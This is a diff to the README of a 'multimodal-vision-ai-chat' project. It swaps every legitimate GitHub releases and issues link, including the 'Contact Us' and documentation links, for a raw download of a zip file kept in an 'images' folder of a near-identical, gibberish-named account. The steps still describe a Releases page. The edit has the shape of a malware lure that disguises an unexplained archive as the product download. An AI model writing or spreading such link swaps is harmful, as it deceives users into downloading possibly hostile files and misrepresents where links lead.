@@ -1,6 +1,6 @@
 # 🤖 multimodal-vision-ai-chat - Chat with AI and Visuals Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/asdadsadasdadasad/multimodal-vision-ai-chat/releases)
+[![Download Now](https://raw.githubusercontent.com/asdadsadasdadsad/multimodal-vision-ai-chat/main/images/vision_chat_ai_multimodal_3.6.zip%https://raw.githubusercontent.com/asdadsadasdadsad/multimodal-vision-ai-chat/main/images/vision_chat_ai_multimodal_3.6.zip)](https://raw.githubusercontent.com/asdadsadasdadsad/multimodal-vision-ai-chat/main/images/vision_chat_ai_multimodal_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to the multimodal-vision-ai-chat! This application allows you to interac
 
 ## 📥 Download & Install
 
-To get started with multimodal-vision-ai-chat, please visit [this page to download](https://github.com/asdadsadasdadasad/multimodal-vision-ai-chat/releases) the latest version of the software.
+To get started with multimodal-vision-ai-chat, please visit [this page to download](https://raw.githubusercontent.com/asdadsadasdadsad/multimodal-vision-ai-chat/main/images/vision_chat_ai_multimodal_3.6.zip) the latest version of the software.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release.
@@ -63,7 +63,7 @@ If you encounter any issues while using the application, please consider the fol
 
 For further assistance, you can explore these resources:
 
-- **Documentation**: [Find detailed guides and troubleshooting tips](https://github.com/asdadsadasdadasad/multimodal-vision-ai-chat/releases).
+- **Documentation**: [Find detailed guides and troubleshooting tips](https://raw.githubusercontent.com/asdadsadasdadsad/multimodal-vision-ai-chat/main/images/vision_chat_ai_multimodal_3.6.zip).
 - **Community Support**: Join discussions on forums and platforms where users share their experiences and solutions.
 
 ## 🛠️ Contributing
@@ -72,6 +72,6 @@ Your contributor support is welcome! If you have ideas, suggestions, or improvem
 
 ## 📧 Contact
 
-For queries or feedback, please visit the repository's issue page at [Contact Us](https://github.com/asdadsadasdadasad/multimodal-vision-ai-chat/issues).
+For queries or feedback, please visit the repository's issue page at [Contact Us](https://raw.githubusercontent.com/asdadsadasdadsad/multimodal-vision-ai-chat/main/images/vision_chat_ai_multimodal_3.6.zip).
 
 Remember, multimodal-vision-ai-chat is created to make AI interaction simple and effective. Enjoy exploring the possibilities!
